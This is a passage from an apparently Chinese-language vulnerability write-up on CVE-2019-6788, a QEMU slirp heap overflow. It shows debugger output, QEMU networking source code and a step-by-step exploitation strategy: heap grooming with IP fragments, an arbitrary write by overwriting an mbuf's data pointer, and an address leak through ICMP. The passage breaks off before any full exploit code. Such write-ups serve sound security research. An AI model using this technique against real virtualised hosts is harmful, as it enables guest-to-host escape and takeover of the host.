class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *m</span><br><span class="line">$<span class="number">9</span> = &#123;</span><br><span class="line">  m_next = <span class="number">0x7f6889ff6800</span>,</span><br><span class="line">  m_prev = <span class="number">0x5606f07b6a38</span>,</span><br><span class="line">  m_nextpkt = <span class="number">0x0</span>,</span><br><span class="line">  m_prevpkt = <span class="number">0x0</span>,</span><br><span class="line">  m_flags = <span class="number">4</span>,</span><br><span class="line">  m_size = <span class="number">1544</span>,</span><br><span class="line">  m_so = <span class="number">0x7f688a3f8a50</span>,</span><br><span class="line">  m_data = <span class="number">0x5606f19888b4</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...,</span><br><span class="line">  m_len = <span class="number">1280</span>,</span><br><span class="line">  slirp = <span class="number">0x5606f07b6990</span>,</span><br><span class="line">  resolution_requested = <span class="literal">false</span>,</span><br><span class="line">  expiration_date = <span class="number">18446744073709551615</span>,</span><br><span class="line">  m_ext = <span class="number">0x5606f1988870</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">  m_dat = <span class="number">0x5606f1988860</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p so-&gt;so_rcv</span><br><span class="line">$<span class="number">10</span> = &#123;</span><br><span class="line">  sb_cc = <span class="number">0</span>,</span><br><span class="line">  sb_datalen = <span class="number">8760</span>,</span><br><span class="line">  sb_wptr = <span class="number">0x7f688a4150f0</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...,</span><br><span class="line">  sb_rptr = <span class="number">0x7f688a4150f0</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...,</span><br><span class="line">  sb_data = <span class="number">0x7f688a4150f0</span> <span class="string">&#x27;A&#x27;</span> &lt;repeats <span class="number">200</span> times&gt;...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行到第二次<code>tcp_input</code>条件判断处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x so-&gt;so_rcv</span><br><span class="line">$<span class="number">12</span> = &#123;</span><br><span class="line">  sb_cc = <span class="number">0x0</span>,</span><br><span class="line">  sb_datalen = <span class="number">0x2238</span>,</span><br><span class="line">  sb_wptr = <span class="number">0x7f688a4155f0</span>,</span><br><span class="line">  sb_rptr = <span class="number">0x7f688a4155f0</span>,</span><br><span class="line">  sb_data = <span class="number">0x7f688a4150f0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到这里的<code>sb_cc</code>为<code>0</code>，但是<code>wptr</code>即写指针已经增加了<code>0x500</code>，那么经过几次的拷贝就会造成堆溢出，覆盖某些关键的结构体造成<code>crash</code>。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序基本上开启了全部的保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/root/pwn/qemu/qemu-system-x86_64&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>要想实现程序的任意代码执行，首先需要信息泄漏得到<code>libc</code>基址和程序基址等信息，然后利用堆溢出控制程序的执行流。整个漏洞的利用包含四个部分</p><ul><li><code>malloc</code>原语</li><li>任意地址写</li><li>信息泄漏</li><li>控制程序执行流程</li></ul><h3 id="malloc-原语"><a href="#malloc-原语" class="headerlink" title="malloc 原语"></a>malloc 原语</h3><p><code>qemu</code>的堆排布非常的复杂，因此如果我们想要控制堆块布局就需要首先将堆内存清空，使得堆的申请都是从<code>top chunk</code>中进行分配，那么这样的堆布局就是可控和可预测的了。我们可以通过<code>ip</code>分片在<code>slirp</code>中的实现来构造<code>malloc</code>原语。</p><p>首先我们看一下<code>ip</code>数据包的结构</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/1.jpg" alt="图片无法显示，请联系作者" title=" "><p><code>ip</code>数据包的长度<code>total length</code>使用两字节表示，即最大为<code>65535</code>字节，一旦发送的长度超过这个字节就需要对数据包进行分段传输。主要关注以下<code>Flags</code>的标志位和<code>Fragment Offset</code></p><ul><li><code>zero</code>：未使用，置为<code>0</code></li><li><code>Do not fragment flag</code>：表示数据包是否为分片数据包，当置为<code>1</code>的时候未分片，简写为<code>DF</code>标志位</li><li><code>More fragments following flag</code>：表示后续还有无分片数据包，有的话置为<code>1</code>，简写为<code>MF</code>标志位</li><li><code>Fragment Offset</code>：分段偏移即当前数据包在整个大数据包中的偏移</li></ul><p><code>ip</code>数据包的数据结构源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HOST_WORDS_BIGENDIAN</span></span><br><span class="line"><span class="type">uint8_t</span> ip_v:<span class="number">4</span>,<span class="comment">/* version */</span></span><br><span class="line">ip_hl:<span class="number">4</span>;<span class="comment">/* header length */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">uint8_t</span> ip_hl:<span class="number">4</span>,<span class="comment">/* header length */</span></span><br><span class="line">ip_v:<span class="number">4</span>;<span class="comment">/* version */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">uint8_t</span>ip_tos;<span class="comment">/* type of service */</span></span><br><span class="line"><span class="type">uint16_t</span>ip_len;<span class="comment">/* total length */</span></span><br><span class="line"><span class="type">uint16_t</span>ip_id;<span class="comment">/* identification */</span></span><br><span class="line"><span class="type">uint16_t</span>ip_off;<span class="comment">/* fragment offset field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>IP_DF 0x4000<span class="comment">/* don&#x27;t fragment flag */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>IP_MF 0x2000<span class="comment">/* more fragments flag */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>IP_OFFMASK 0x1fff<span class="comment">/* mask for fragmenting bits */</span></span></span><br><span class="line"><span class="type">uint8_t</span> ip_ttl;<span class="comment">/* time to live */</span></span><br><span class="line"><span class="type">uint8_t</span> ip_p;<span class="comment">/* protocol */</span></span><br><span class="line"><span class="type">uint16_t</span>ip_sum;<span class="comment">/* checksum */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span><span class="title">in_addr</span> <span class="title">ip_src</span>,<span class="title">ip_dst</span>;</span><span class="comment">/* source and dest address */</span></span><br><span class="line">&#125; QEMU_PACKED;</span><br></pre></td></tr></table></figure><p>其中<code>ip</code>数据包分段的实现在<code>strip/ip_input.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ip_input</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span></span><br><span class="line">&#123;</span><br><span class="line">Slirp *slirp = m-&gt;slirp;</span><br><span class="line"><span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">ip</span>;</span></span><br><span class="line"><span class="type">int</span> hlen;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment"> * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment"> * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment"> * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment"> * but it&#x27;s not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * XXX This should fail, don&#x27;t fragment yet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Look for queue of fragments</span></span><br><span class="line"><span class="comment"> * of this datagram.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, <span class="keyword">struct</span> ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">found:</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Adjust ip_len to not reflect header,</span></span><br><span class="line"><span class="comment"> * set ip_mff if more fragments are expected,</span></span><br><span class="line"><span class="comment"> * convert offset of this to bytes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ip-&gt;ip_len -= hlen;</span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment"> * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment"> * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">m = dtom(slirp, ip);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> (fp)</span><br><span class="line">      ip_freef(slirp, fp);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">ip-&gt;ip_len -= hlen;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ip *</span><br><span class="line"><span class="title function_">ip_reass</span><span class="params">(Slirp *slirp, <span class="keyword">struct</span> ip *ip, <span class="keyword">struct</span> ipq *fp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If first fragment to arrive, create a reassembly queue.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> =</span> m_get(slirp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> mbuf *</span><br><span class="line"><span class="title function_">m_get</span><span class="params">(Slirp *slirp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span>;</span></span><br><span class="line"><span class="type">int</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">DEBUG_CALL(<span class="string">&quot;m_get&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;</span><br><span class="line">                m = g_malloc(SLIRP_MSIZE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码逻辑来看，如果<code>flag</code>没有设置<code>IP_DF</code>即表示需要进行分段，那么会在当前的链表中首先查找是否存在相应的数据包，如果没找到即将<code>fp</code>设置为空，表示该数据包是相应数据流的第一个数据包，接着调用<code>ip_reass</code>函数，如果<code>fp=NULL</code>，那么就会调用<code>m_get</code>函数为其分配一个<code>mbuf</code>结构体，大小为<code>SLIRP_MSIZE=0x668</code>，即申请了一个<code>0x670</code>大小的堆块，并将其放入到链表中。</p><p>也就是说我们可以构造数据包使得其<code>IP_DF</code>为空，那么就会分配<code>0x670</code>大小的堆块。这样就实现了<code>malloc</code>原语。</p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>任意地址写的构造主要基于堆溢出以及<code>ip_reass</code>函数，关键的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ip_input</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If offset or IP_MF are set, must reassemble.</span></span><br><span class="line"><span class="comment"> * Otherwise, nothing need be done.</span></span><br><span class="line"><span class="comment"> * (We could look in the reassembly queue to see</span></span><br><span class="line"><span class="comment"> * if the packet was previously fragmented,</span></span><br><span class="line"><span class="comment"> * but it&#x27;s not worth the time; just let them time out.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * XXX This should fail, don&#x27;t fragment yet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;</span><br><span class="line">  <span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipq</span> *<span class="title">fp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">qlink</span> *<span class="title">l</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Look for queue of fragments</span></span><br><span class="line"><span class="comment"> * of this datagram.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;</span><br><span class="line">     l = l-&gt;next) &#123;</span><br><span class="line">            fp = container_of(l, <span class="keyword">struct</span> ipq, ip_link);</span><br><span class="line">            <span class="keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;</span><br><span class="line">                    ip-&gt;ip_p == fp-&gt;ipq_p)</span><br><span class="line">    <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">        fp = <span class="literal">NULL</span>;</span><br><span class="line">found:</span><br><span class="line">ip-&gt;ip_len -= hlen;</span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)</span><br><span class="line">  ip-&gt;ip_tos |= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  ip-&gt;ip_tos &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">ip-&gt;ip_off &lt;&lt;= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If datagram marked as having more fragments</span></span><br><span class="line"><span class="comment"> * or if this is not the first fragment,</span></span><br><span class="line"><span class="comment"> * attempt reassembly; if it succeeds, proceed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ip-&gt;ip_tos &amp; <span class="number">1</span> || ip-&gt;ip_off) &#123;</span><br><span class="line">ip = ip_reass(slirp, ip, fp);</span><br><span class="line">                        <span class="keyword">if</span> (ip == <span class="literal">NULL</span>)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ip *</span><br><span class="line"><span class="title function_">ip_reass</span><span class="params">(Slirp *slirp, <span class="keyword">struct</span> ip *ip, <span class="keyword">struct</span> ipq *fp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m</span> =</span> dtom(slirp, ip);</span><br><span class="line"><span class="keyword">register</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipasfrag</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="type">int</span> hlen = ip-&gt;ip_hl &lt;&lt; <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> i, next;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reassembly is complete; concatenate fragments.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    q = fp-&gt;frag_link.next;</span><br><span class="line">m = dtom(slirp, q);</span><br><span class="line"></span><br><span class="line">q = (<span class="keyword">struct</span> ipasfrag *) q-&gt;ipf_next;</span><br><span class="line"><span class="keyword">while</span> (q != (<span class="keyword">struct</span> ipasfrag*)&amp;fp-&gt;frag_link) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">t</span> =</span> dtom(slirp, q);</span><br><span class="line">  q = (<span class="keyword">struct</span> ipasfrag *) q-&gt;ipf_next;</span><br><span class="line">  m_cat(m, t);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy data from one mbuf to the end of</span></span><br><span class="line"><span class="comment"> * the other.. if result is too big for one mbuf, allocate</span></span><br><span class="line"><span class="comment"> * an M_EXT data segment</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">m_cat</span><span class="params">(<span class="keyword">struct</span> mbuf *m, <span class="keyword">struct</span> mbuf *n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If there&#x27;s no room, realloc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)</span><br><span class="line">m_inc(m, m-&gt;m_len + n-&gt;m_len);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);</span><br><span class="line">m-&gt;m_len += n-&gt;m_len;</span><br><span class="line"></span><br><span class="line">m_free(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>ip_input</code>函数中，当数据包的标志位<code>IP_MF</code>不为<code>1</code>即数据包是最后一个切片数据包的时候会调用<code>ip_reass</code>函数，在函数中会调用<code>m_cat</code>函数将数据包组合起来。关键的代码就是<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len)</code>，如果我们可以利用堆溢出覆写<code>m_data</code>，就可以实现将可控的数据写入到<code>m_data+m_len</code>处。</p><p><code>exp</code>中实现任意写的逻辑如下，首先利用<code>malloc</code>原语将堆清空。接着利用<code>socket</code>与<code>113</code>端口建立连接，申请出可以溢出的结构体<code>so_rcv</code>结构体。紧接着在后面分配一个<code>ip</code>切片数据包<code>mbuf</code>，其<code>id</code>为<code>0xdead</code>。由于堆排布，该数据包是紧贴着<code>so_rcv</code>的，可以利用堆溢出覆盖<code>mbuf</code>中的<code>m_data</code>指针。最后再次发送<code>0xdead</code>并且<code>MF</code>标志位为<code>0</code>的数据包，触发<code>memcpy</code>函数将数据拷贝到<code>m_data</code>指针处，实现任意地址写。</p><h3 id="地址泄漏"><a href="#地址泄漏" class="headerlink" title="地址泄漏"></a>地址泄漏</h3><p>泄漏地址的方法是利用<code>icmp</code>响应包实现的。我们先来看一下<code>tcp</code>协议和<code>icmp</code>协议。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/2.jpg" alt="图片无法显示，请联系作者" title=" "><p><code>tcp</code>数据包的数据结构源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> tcphdr slirp_tcphdr</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> &#123;</span></span><br><span class="line"><span class="type">uint16_t</span> th_sport;              <span class="comment">/* source port */</span></span><br><span class="line"><span class="type">uint16_t</span> th_dport;              <span class="comment">/* destination port */</span></span><br><span class="line">tcp_seqth_seq;<span class="comment">/* sequence number */</span></span><br><span class="line">tcp_seqth_ack;<span class="comment">/* acknowledgement number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HOST_WORDS_BIGENDIAN</span></span><br><span class="line"><span class="type">uint8_t</span>th_off:<span class="number">4</span>,<span class="comment">/* data offset */</span></span><br><span class="line">th_x2:<span class="number">4</span>;<span class="comment">/* (unused) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">uint8_t</span>th_x2:<span class="number">4</span>,<span class="comment">/* (unused) */</span></span><br><span class="line">th_off:<span class="number">4</span>;<span class="comment">/* data offset */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">uint8_t</span> th_flags;</span><br><span class="line"><span class="type">uint16_t</span> th_win;                <span class="comment">/* window */</span></span><br><span class="line"><span class="type">uint16_t</span> th_sum;                <span class="comment">/* checksum */</span></span><br><span class="line"><span class="type">uint16_t</span> th_urp;                <span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>icmp</code>数据包的数据结构表如下</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210130201723565.png" alt="图片无法显示，请联系作者" title=" "><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td 